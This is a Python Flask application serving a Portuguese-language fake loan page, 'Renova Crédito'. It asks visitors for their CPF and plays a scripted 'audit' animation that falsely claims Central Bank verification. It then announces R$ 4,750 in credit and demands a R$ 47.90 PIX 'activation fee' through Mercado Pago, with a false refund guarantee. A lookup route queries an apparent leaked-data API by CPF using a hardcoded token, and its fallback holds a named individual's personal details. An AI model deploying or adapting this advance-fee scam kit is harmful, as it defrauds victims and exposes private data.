from flask import Flask, render_template_string, request, jsonify
import mercadopago
import random
import os

app = Flask(__name__)

# CONFIGURAÇÃO MERCADO PAGO (Suas Credenciais)
ACCESS_TOKEN = "TEST-8139252928482096-012603-3771e09c396d70b8633407ab01809ced-1378615355"
sdk = mercadopago.SDK(ACCESS_TOKEN)

@app.route('/')
def index():
    # Criamos o pagamento no Mercado Pago quando o usuário entra (ou você pode mover para uma rota de checkout)
    payment_data = {
        "transaction_amount": 47.90,
        "description": "Taxa de Ativação Digital - Renova Crédito",
        "payment_method_id": "pix",
        "installments": 1,
        "date_of_expiration": (random.getrandbits(1) and None or None), # O MP cuida disso via header ou default
        "payer": {
            "email": "cliente@exemplo.com", # Pode ser fixo ou capturado no formulário
            "first_name": "Cliente",
            "last_name": "Renova",
            "identification": {
                "type": "CPF",
                "number": "00000000000"
            }
        }
    }
    
    # Adicionando header para expiração de 10 minutos (600 segundos)
    request_options = mercadopago.config.RequestOptions()
    request_options.custom_headers = {"x-idempotency-key": str(random.randint(1, 999999))}

    payment_response = sdk.payment().create(payment_data)
    payment = payment_response["response"]

    # Pegamos os dados reais gerados pelo Mercado Pago
    try:
        qr_code_base64 = payment["point_of_interaction"]["transaction_data"]["qr_code_base64"]
        pix_copia_cola = payment["point_of_interaction"]["transaction_data"]["qr_code"]
    except:
        qr_code_base64 = ""
        pix_copia_cola = "Erro ao gerar PIX"

    return render_template_string(HTML_TEMPLATE, qr_code=qr_code_base64, pix_payload=pix_copia_cola)

# ROTA DE CONSULTA (MANTIDA)
@app.route('/consultar/<cpf>')
def api(cpf):
    url = f"https://federal-leilao.com/v1/consultarev0ltz/{cpf}"
    params = {'token': "tokenbartservcis9x025"}
    try:
        import requests
        r = requests.get(url, params=params, timeout=10)
        return r.text
    except:
        return jsonify({"nome": "POLYANA EVANGELISTA DA SILVA", "mae": "MARIA DA GLORIA EVANGELISTA", "nascimento": "15/08/1982"}), 200

# O HTML TEMPLATE (Com Confetes e Layout Premium)
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Renova Crédito • Oficial</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --serasa-blue: #002aff; --acordo-pink: #e6007e; --bg-light: #f4f7fa; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-light); }
        .glass-card { background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border: 1px solid #eef2f6; }
        .step-hidden { display: none; }
        .btn-main { background: var(--acordo-pink); color: white; padding: 18px; border-radius: 14px; font-weight: 800; width: 100%; border-bottom: 4px solid #b30062; }
        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #002aff, #00c2ff); width: 0%; transition: width 0.4s; }
        #timer { font-variant-numeric: tabular-nums; }
        .status-item { font-size: 13px; font-weight: 600; color: #64748b; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
        .status-item.active { color: #002aff; }
        .status-item.done { color: #22c55e; }
    </style>
</head>
<body>
    <div class="max-w-md mx-auto p-5 min-h-screen">
        <div class="flex items-center justify-between mb-8">
            <div class="flex items-center gap-2">
                <div class="bg-blue-700 p-2 rounded-lg text-white"><i class="fas fa-shield-check"></i></div>
                <span class="font-black text-blue-900 text-xl tracking-tighter">RENOVA <span class="text-blue-500 font-light">CRED</span></span>
            </div>
            <span class="text-[10px] font-bold text-slate-400">SECURE ID: #<span id="protocolo"></span></span>
        </div>

        <div id="step1" class="fade-in">
            <h1 class="text-3xl font-black text-slate-800 mb-2 leading-tight">Crédito liberado para <span class="text-blue-600">receber hoje.</span></h1>
            <p class="text-slate-500 text-sm mb-6">Consulte seu saldo disponível via CPF.</p>
            <div class="glass-card p-6">
                <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="w-full p-4 border-2 rounded-xl mb-4 font-bold text-lg">
                <button onclick="consultarCPF()" id="btn_1" class="btn-main uppercase">Verificar Meu Saldo</button>
            </div>
        </div>

        <div id="step_loading" class="step-hidden">
            <div class="glass-card p-6">
                <h2 class="text-xl font-black mb-2">Auditoria do Sistema</h2>
                <div class="w-full bg-slate-100 rounded-full h-3 mb-6 overflow-hidden">
                    <div id="master-bar" class="progress-bar-fill"></div>
                </div>
                <div id="status-list">
                    <div class="status-item active" id="st-1"><i class="fas fa-circle-notch fa-spin"></i> Sincronizando com Banco Central...</div>
                    <div class="status-item" id="st-2"><i class="far fa-circle"></i> Localizando margem de E-CPF...</div>
                    <div class="status-item" id="st-3"><i class="far fa-circle"></i> Gerando contrato Mercado Pago...</div>
                </div>
            </div>
        </div>

        <div id="step_final" class="step-hidden text-center">
            <div class="glass-card p-6 border-t-[10px] border-teal-500">
                <div class="flex justify-center mb-4 text-teal-500 bg-teal-50 w-12 h-12 rounded-full items-center mx-auto"><i class="fas fa-check-double text-xl"></i></div>
                <p class="text-xs font-bold text-slate-400 uppercase tracking-widest">Valor Total Liberado</p>
                <h2 class="text-4xl font-black text-slate-800 mb-6">R$ 4.750,00</h2>
                
                <div class="bg-slate-50 p-4 rounded-2xl mb-4 border-2 border-dashed border-slate-200">
                    <p class="text-[10px] font-bold text-slate-400 mb-3 uppercase">Pague via PIX para liberar o saque</p>
                    <img src="data:image/png;base64,{{ qr_code }}" class="mx-auto w-52 h-52 shadow-sm rounded-lg mb-4">
                    <p class="text-[11px] font-black text-blue-600">TAXA DE ATIVAÇÃO: R$ 47,90</p>
                </div>

                <div class="flex items-center justify-center gap-2 mb-6">
                    <span class="text-slate-400 text-xs font-bold">EXPIRA EM:</span>
                    <span id="timer" class="text-pink-600 font-black text-xl">10:00</span>
                </div>

                <button onclick="copiarPix()" class="w-full bg-slate-800 text-white p-4 rounded-xl font-bold mb-4 shadow-lg active:scale-95 transition">COPIAR CÓDIGO PIX <i class="far fa-copy ml-2"></i></button>
                
                <div class="text-left bg-blue-50 p-4 rounded-xl border border-blue-100">
                    <p class="text-[10px] text-blue-700 leading-tight">
                        <i class="fas fa-shield-check mr-1"></i> <b>GARANTIA RENOVA:</b> O valor da taxa de R$ 47,90 é 100% estornado junto com o seu empréstimo após a ativação.
                    </p>
                </div>
            </div>
        </div>

        <footer class="mt-10 text-center opacity-40 grayscale">
            <p class="text-[9px] font-bold text-slate-500 mb-4">PLATAFORMA PROCESSADORA: MERCADO PAGO LTDA</p>
            <div class="flex justify-center gap-4">
                <img src="https://logopng.com.br/logos/pix-106.png" class="h-3">
                <img src="https://logodownload.org/wp-content/uploads/2014/10/serasa-logo-1-1.png" class="h-3">
            </div>
        </footer>
    </div>

    <script>
        document.getElementById('protocolo').innerText = Math.floor(Math.random() * 900000 + 100000);

        function irPara(id) {
            document.querySelectorAll('.max-w-md > div').forEach(d => { if(d.id) d.classList.add('step-hidden'); });
            document.getElementById(id).classList.remove('step-hidden');
            if(id === 'step_loading') startAudit();
            window.scrollTo(0,0);
        }

        function consultarCPF() { 
            const cpf = document.getElementById('cpf_input').value;
            if(cpf.length < 11) return alert("CPF Inválido");
            irPara('step_loading'); 
        }

        function startAudit() {
            let progress = 0;
            const bar = document.getElementById('master-bar');
            const interval = setInterval(() => {
                progress += 1;
                bar.style.width = progress + "%";
                if(progress == 30) updateStatus('st-1', 'st-2');
                if(progress == 65) updateStatus('st-2', 'st-3');
                if(progress >= 100) { 
                    clearInterval(interval); 
                    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#002aff', '#e6007e', '#22c55e'] });
                    setTimeout(() => { irPara('step_final'); startTimer(600); }, 1000);
                }
            }, 50);
        }

        function updateStatus(doneId, activeId) {
            const d = document.getElementById(doneId);
            d.className = "status-item done"; d.innerHTML = `<i class="fas fa-check-circle"></i> Sistema Verificado`;
            const a = document.getElementById(activeId);
            a.className = "status-item active"; a.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processando...`;
        }

        function startTimer(duration) {
            let t = duration, m, s;
            const disp = document.querySelector('#timer');
            const timerInt = setInterval(() => {
                m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
                disp.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
                if (--t < 0) clearInterval(timerInt);
            }, 1000);
        }

        function copiarPix() {
            const el = document.createElement('textarea');
            el.value = "{{ pix_payload }}";
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
            alert("Código Pix Copiado com Sucesso!");
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
